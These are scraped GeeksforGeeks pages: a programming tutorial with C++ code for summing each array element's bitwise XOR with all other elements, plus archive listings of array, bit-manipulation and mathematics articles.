open Netflix of course! Whether you want to… Read More » GBlogMachine Learning Deploying ML Models as API using FastAPI Last Updated: 18-12-2020 Deployment usually the last step in any Data Science Project Pipeline, to be able to integrate your ML/DL model to a web application is quite… Read More » Machine LearningML-deployment 10 Best Artificial Intelligence Project Ideas To Kick-Start Your Career Last Updated: 18-12-2020 It is quite known to everyone how Artificial Intelligence and Machine Learning are dominating the tech world in the present-day scenario. And you might be… Read More » GBlogMachine LearningArtificial Intelligence Top 10 Javascript Libraries for Machine Learning and Data Science Last Updated: 14-12-2020 JavaScript is the programming language of the web which makes it pretty important! However, it has mostly been used as a scripting language in web… Read More » GBlogJavaScriptMachine Learning Difference between ANN and BNN Last Updated: 14-12-2020 Do you ever think of what it’s like to build anything like a brain, how these things work, or what do they do? Let us… Read More » Difference BetweenMachine Learning Top 5 Applications of Machine Learning in Cyber Security Last Updated: 11-12-2020 Cybersecurity is a critical part of any company. Not only companies but even governments need top-class cybersecurity to make sure that their data remains private… Read More » GBlogMachine LearningCyber-security Difference Between Various Fields of Advanced Analytics Last Updated: 14-12-2020 3 The analysis is the process of breaking a complex chunk of data into smaller parts in order to gain a better understanding of it. The… Read More » Difference BetweenMachine Learning Convert A Categorical Variable Into Dummy Variables Last Updated: 11-12-2020 All the statistical and machine learning models are built on the foundation of data. A grouped or composite entity holding the relevant to a particular… Read More » Machine LearningPythonPython-pandas Gaussian Discriminant Analysis Last Updated: 09-12-2020 There are two types of Supervised Learning algorithms used for classification in Machine Learning. Discriminative Learning Algorithms Generative Learning Algorithms Discriminative Learning Algorithms include Logistic… Read More » Machine LearningMathematical Facebook Transcoder Last Updated: 02-12-2020 Transcoder was proposed by researchers at Facebook in September 2020 in the paper titled “Unsupervised Translation of Programming Languages”. The goal of the project was… Read More » Machine Learning ML(Machine Learning) vs ML(Meta Language) Last Updated: 02-12-2020 There are lots of abbreviations used in the Computer Science domain for various technologies such as HTML, HTTPS, API, etc. However, sometimes we have a… Read More » Difference BetweenMachine Learning F-Test Last Updated: 26-11-2020 F-Test is any test that utilizes the F-Distribution table to fulfil its purpose (for eg: ANOVA). It compares the ratio of the variances of two… Read More » Machine Learning FOCL Algorithm Last Updated: 26-11-2020 Prerequisite : FOIL Algorithm The First Order Combined Learner (FOCL) Algorithm is an extension of the purely inductive, FOIL Algorithm. It uses domain theory to… Read More » Machine Learning Z-test Last Updated: 26-11-2020 Z-test is a statistical method to determine whether the distribution of the test statistics can be approximated by a normal distribution. It is the method… Read More » Engineering MathematicsMachine Learning Hyperparameter tuning using GridSearchCV and KerasClassifier Last Updated: 26-11-2020 Hyperparameter tuning is done to increase the efficiency of a model by tuning the parameters of the neural network. Some scikit-learn APIs like GridSearchCV and… Read More » Machine LearningPythonDeep-LearningTensorflow Page 1 of 6112345...102030...»Last » Most popular in Machine Learning Crossover in Genetic AlgorithmMarkov Decision ProcessComparison b/w Bagging and Boosting | Data MiningML | Dampster Shafer TheoryMajor Kernel Functions in Support Vector Machine (SVM) Most Visited in Machine Learning ML | Frequent Pattern Growth AlgorithmML | Classification vs RegressionTypes of Environments in AIML | Classification vs ClusteringML | K-Medoids clustering with solved example room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Sum of Bitwise XOR of each array element with all other array elements - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other array elements. Examples: Input: arr[] = {1, 2, 3}Output: 5 4 3Explanation:For arr[0]: arr[0] ^ arr[0] + arr[0] ^ arr[1] + arr[0] ^ arr[2] = 1^1 + 1^2 + 1^3 = 0 + 3 + 2 = 5For arr[1]: arr[1] ^ arr[0] + arr[1] ^ arr[1] + arr[1] ^ arr[2] = 2^1 + 2^2 + 2^3 = 3 + 0 + 1 = 4For arr[2]: arr[2] ^ arr[0] + arr[2] ^ arr[1] + arr[2] ^ arr[2] = 3^1 + 3^2 + 3^3 = 2 + 2 + 0 = 3 Input : arr[] = {2, 4, 8}Output: 16 18 22Explanation:For arr[0]: arr[0] ^ arr[0] + arr[0] ^ arr[1] + arr[0] ^ arr[2] = 2^2 + 2^4 + 2^8 = 0 + 6 + 10 = 16.For arr[1]: arr[1] ^ arr[0] + arr[1] ^ arr[1] + arr[1] ^ arr[2] = 4^2 + 4^4 + 4^8 = 6 + 0 + 12 = 18For arr[2]: arr[2] ^ arr[0] + arr[2] ^ arr[1] + arr[2] ^ arr[2] = 8^2 + 8^4 + 8^8 = 10 + 12 + 0 = 22 Naive Approach: The idea is to traverse the array and for each array element, traverse the array and calculate sum of its Bitwise XOR with all other array elements. Time Complexity: O(N2)Auxiliary Space: O(N) Efficient Approach: To` optimize the above approach, the idea is to use property of Bitwise XOR that similar bits on xor, gives 0, or 1 otherwise. Follow the below steps to solve the problem: Calculate the frequency of set bits at position i where 0 <= i <= 32, across all the elements of the array in a frequency array. For every element X, of the array, calculate the xor sum by running a loop from i=0 to 32 and check if ith bit of X is set. If yes, then add (N – frequency[i])*2i to the xor sum because the set bit of X at this position will make all the set bits to zero and all the unset bits to 1. Otherwise, add frequency[i] * 2i to the xor sum. Calculate the sum of all the xor sum of every element of the array and return as the answer. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Function to calculate for each array // element, sum of its Bitwise XOR with // all other array elements void XOR_for_every_i(int A[], int N) { // Declare an array of size 64 // to store count of each bit int frequency_of_bits[32]{}; // Traversing the array for (int i = 0; i < N; i++) { int bit_position = 0; int M = A[i]; while (M) { // Check if bit is present of not if (M & 1) { frequency_of_bits[bit_position] += 1; } // Increase the bit position bit_position += 1; // Reduce the number to half M >>= 1; } } // Traverse the array for (int i = 0; i < N; i++) { int M = A[i]; // Stores the bit position int value_at_that_bit = 1; // Stores the sum of Bitwise XOR int XOR_sum = 0; for (int bit_position = 0; bit_position < 32; bit_position++) { // Check if bit is present of not if (M & 1) { XOR_sum += (N - frequency_of_bits[bit_position]) * value_at_that_bit; } else { XOR_sum += (frequency_of_bits[bit_position]) * value_at_that_bit; } // Reduce the number to its half M >>= 1; value_at_that_bit <<= 1; } // Print the sum for A[i] cout << XOR_sum << ' '; } return; } // Driver Code int main() { // Given array int A[] = { 1, 2, 3 }; // Given N int N = sizeof(A) / sizeof(A[0]); // Function Call XOR_for_every_i(A, N); return 0; } chevron_right filter_none Output: 5 4 3 Time Complexity: O(N)Auxiliary Space: O(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Total pairs in an array such that the bitwise AND, bitwise OR and bitwise XOR of LSB is 1Calculate Bitwise OR of two integers from their given Bitwise AND and Bitwise XOR valuesReplace every element of the array with BitWise XOR of all otherSum of Bitwise OR of each array element of an array with all elements of another arrayLeftover element after performing alternate Bitwise OR and Bitwise XOR operations on adjacent pairsFind the triplet from given Bitwise XOR and Bitwise AND values of all its pairsForm an array of distinct elements with each element as sum of an element from each arrayQueries to update each element in subarray to Bitwise XOR with a given valueCount pairs with bitwise XOR exceeding bitwise AND from a given arrayCount ways to generate pairs having Bitwise XOR and Bitwise AND equal to X and Y respectivelyReplace every array element by Bitwise Xor of previous and next elementMaximum sum of Bitwise XOR of all elements of two equal length subsetsCount ways to make Bitwise XOR of odd and even indexed elements equal by removing an array elementMaximize sum of squares of array elements possible by replacing pairs with their Bitwise AND and Bitwise ORSum of product of each element with each element after itRange Query on array whose each element is XOR of index value and previous elementCount set bits in Bitwise XOR of all adjacent elements upto NReplace every element of the array by sum of all other elementsArray formed using sum of absolute differences of that element with all other elementsLength of array pair formed where one contains all distinct elements and other all same elementsnk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArraysBit MagicMathematicalBitwise-XORsetBitCount Practice Tags : ArraysMathematicalBit Magic thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Smallest number greater than or equal to N which is divisible by its non-zero digits Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most visited in Bit Magic Bitwise Operators in C/C++Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Left Shift and Right Shift Operators in C/C++Cyclic Redundancy Check and Modulo-2 DivisionHow to swap two numbers without using a temporary variable? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Arrays Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Category Archives: Arrays Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element… Read More » ArraysBit MagicprefixsetBitCount Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements… Read More » ArraysMathematicalarray-rearrangefrequency-counting Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Maximize the common difference of an AP having the given array as a subsequence Last Updated: 20-12-2020 Given a sorted array arr[] consisting of N distinct elements, the task is to find the maximum possible common difference of an arithmetic progression such… Read More » ArraysGreedyMathematicalarithmetic progressionArithmetic ProgressionsMaths Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray Minimize the maximum difference of any pair by doubling odd elements and reducing even elements by half Last Updated: 20-12-2020 Given an array arr[] consisting of N positive integers, the task is to minimize the maximum difference between any pair of array elements by multiplying… Read More » ArraysHashMathematicalarray-rearrangecpp-setNatural Numbers Count pairs of indices having equal prefix and suffix sums Last Updated: 20-12-2020 Given an array arr[] of length N, the task is to find the count of pairs of indices (i, j) (0-based indexing) such that prefix… Read More » ArraysHashMathematicalSearchingprefix-sumsubarraysubarray-sumsuffix-sum Queries to check if sweets of given type can be eaten on given day or not Last Updated: 19-12-2020 5 Given two arrays A[ ] and B[ ] consisting of N integers, where Ai denotes the quantity of sweets of the ith type and Bi… Read More » ArraysGreedyMathematicalSortingarray-range-queriescpp-paircpp-vector Count subsets in an array having product K Last Updated: 18-12-2020 Given an array arr[] of size N, the task is to find the count of all subsets from the given array whose product of is… Read More » ArraysCombinatorialDynamic ProgrammingMathematicalsubset Minimum number of coins to be collected per hour to empty N piles in at most H hours Last Updated: 21-12-2020 Given an array arr[] consiting of N integers representing the number of coins in each pile, and an integer H, the task is to find… Read More » ArraysDivide and ConquerMathematicalSearchingBinary Search Minimum sum of values subtracted from array elements to make all array elements equal Last Updated: 18-12-2020 Given an array arr[] consisting of N positive integers, the task is to find the sum of all the array elements required to be subtracted… Read More » ArraysGreedyMathematicalarray-rearrange Smallest positive integer that divides all array elements to generate quotients with sum not exceeding K Last Updated: 21-12-2020 Given an array arr[] of size N and a positive integer K, the task is to find the smallest positive integer such that the sum… Read More » ArraysMathematicalPlacementsSearchingBinary Searchinterview-preparation Count pairs (i, j) from given array such that i K * arr[j] Last Updated: 18-12-2020 Given an array arr[] of length N and an integer K, the task is to count the number of pairs (i, j) such that i… Read More » ArraysDivide and ConquerMathematicalSortingMerge Sortpartitionsubarray Page 1 of 25712345...102030...»Last » Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most Visited in Arrays Merge two sorted arraysBuilding Heap from ArrayProgram to find sum of elements in a given arrayGiven an array of size n and a number k, find all elements that appear more than n/k timesMove all negative numbers to beginning and positive to end with constant extra space room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Bit Magic Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Compute the integer absolute value (abs) without branchingBitwise Operators in C/C++Rotate bits of a numberLeft Shift and Right Shift Operators in C/C++Count set bits in an integerTravelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Program to find whether a no is power of twoHow to swap two numbers without using a temporary variable?Josephus problem | Set 1 (A O(n) Solution)Binary representation of a given numberFind the element that appears onceBits manipulation (Important tactics)Little and Big Endian MysteryAdd two numbers without using arithmetic operatorsCount total set bits in all numbers from 1 to nC++ bitset and its applicationPosition of rightmost set bitFind the Number Occurring Odd Number of Times1's and 2's complement of a Binary NumberCyclic Redundancy Check and Modulo-2 DivisionBitwise right shift operators in JavaFind the two non-repeating elements in an array of repeating elements/ Unique Numbers 2Rotate bits of a numberWrite an Efficient C Program to Reverse Bits of a NumberDivide two integers without using multiplication, division and mod operatorFind most significant set bit of a numberCount inversions in an array | Set 3 (Using BIT)Sum of bit differences among all pairsFind XOR of two number without using XOR operatorCount number of bits to be flipped to convert A to B Category Archives: Bit Magic Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element… Read More » ArraysBit MagicprefixsetBitCount Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Sum of maximum of all subarrays by adding even frequent maximum twice Last Updated: 20-12-2020 Given an array arr[] consisting of N integers (All array elements are a perfect power of 2), the task is to calculate the sum of… Read More » ArraysBit MagicMathematicalSearchingfrequency-countingmaths-powersetBitCountsubarray XOR of all even numbers from a given range Last Updated: 21-12-2020 5 Given two integers L and R, the task is to calculate Bitwise XOR of all even numbers in the range [L, R]. Examples: Example: Input: L… Read More » Bit MagicMathematicalBitwise-XOR XOR Linked List – Find Nth Node from the end Last Updated: 17-12-2020 3 Given a XOR linked list and an integer N, the task is to print the Nth node from the end of the given XOR linked… Read More » Bit MagicData StructuresLinked ListBitwise-XOR XOR Linked List – Find the middle node Last Updated: 17-12-2020 3 Given an XOR linked list, the task is to find the middle node of the given XOR linked list. Examples: Input: 4 –> 7 –>… Read More » Bit MagicData StructuresLinked ListBitwise-XOR Positive integers up to N that are not present in given Array Last Updated: 15-12-2020 Given an array a[] and an integer N, the task is to find all natural numbers from the range [1, N] that are nor present… Read More » ArraysBit MagicHashMathematicalHashSet Construct original array starting with K from an array of XOR of all elements except elements at same index Last Updated: 17-12-2020 Given an array A[] consisting of N integers and first element of the array B[] as K, the task is to construct the array B[]… Read More » ArraysBit MagicBitwise-XOR Find, Set, Clear, Toggle and Modify bits in C Last Updated: 11-12-2020 3 Given a positive integer N, the task is to perform the following sequence of operations on the binary representation of N in C. Finding a… Read More » Bit MagicMathematicalTechnical ScripterBit AlgorithmsBitwise-ANDBitwise-ORBitwise-XORTechnical Scripter 2020 XOR Linked List – Insert an element at a specific position Last Updated: 10-12-2020 3.5 Given a XOR linked list and two integers position and value, the task is to insert a node containing value as the positionth node of… Read More » Bit MagicData StructuresLinked ListBitwise-XORLinked Lists Length of the longest subarray whose Bitwise XOR is K Last Updated: 21-12-2020 Given an array arr[] of size N and an integer K, the task is to find the length of the longest subarray having Bitwise XOR… Read More » ArraysBit MagicHashMathematicalBitwise-XORcpp-mapHashprefixsubarray Find the triplet from given Bitwise XOR and Bitwise AND values of all its pairs Last Updated: 10-12-2020 Given six positive integers representing the Bitwise XOR and Bitwise AND of all possible pairs of a triplet (a, b, c), the task is to… Read More » Bit MagicGreedyMathematicalBit AlgorithmsBitwise-ANDBitwise-XOR Find N distinct numbers whose Bitwise XOR is equal to K Last Updated: 16-12-2020 Given two positive integers N and X, the task is to construct N positive integers having Bitwise XOR of all these integers equal to K.… Read More » Bit MagicGreedyMathematicalBitwise-XOR Flip consecutive set bits starting from LSB of a given number Last Updated: 18-12-2020 Given a positive integer N, the task is to find the number that can be obtained by flipping consecutive set bits starting from the LSB… Read More » Bit MagicGreedyMathematicalTechnical ScripterBitwise-ANDTechnical Scripter 2020 Page 1 of 5312345...102030...»Last » Most popular in Bit Magic Operators in C | Set 2 (Relational and Logical Operators)Bit Fields in CCheck whether K-th bit is set or notBuiltin functions of GCC compilerCalculate XOR from 1 to n. Most Visited in Bit Magic Count total bits in a numberDetermine if a string has all Unique CharactersCheck if two numbers are equal without using arithmetic and comparison operatorsSet, Clear and Toggle a given bit of a number in CGray to Binary and Binary to Gray conversion room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Mathematical Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Program for Fibonacci numbersWrite a program to print all permutations of a given stringCoin Change | DP-7Set in C++ Standard Template Library (STL)Sieve of EratosthenesC++ Data TypesProgram to find GCD or HCF of two numbersCounting SortMinimum number of jumps to reach endProgram for Decimal to Binary ConversionUgly NumbersEfficient program to print all prime factors of a given numberFind minimum number of coins that make a given valueOperators in C / C++Merge two sorted arraysPrime NumbersProgram for nth Catalan NumberEuclidean algorithms (Basic and Extended)The Knight's tour problem | Backtracking-1Program to find LCM of two numbersWrite a program to calculate pow(x,n)Min Cost Path | DP-6Count all possible paths from top left to bottom right of a mXn matrixSegment Tree | Set 1 (Sum of given range)Optimal Strategy for a Game | DP-31Merge two sorted arrays with O(1) extra spaceModular multiplicative inverseMedian of two sorted arrays of same sizeWrite a program to reverse digits of a numberCount ways to reach the n'th stair Category Archives: Mathematical Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount Smallest number greater than or equal to N which is divisible by its non-zero digits Last Updated: 21-12-2020 Given an integer N, the task is to find the smallest number greater than or equal to N such that it is 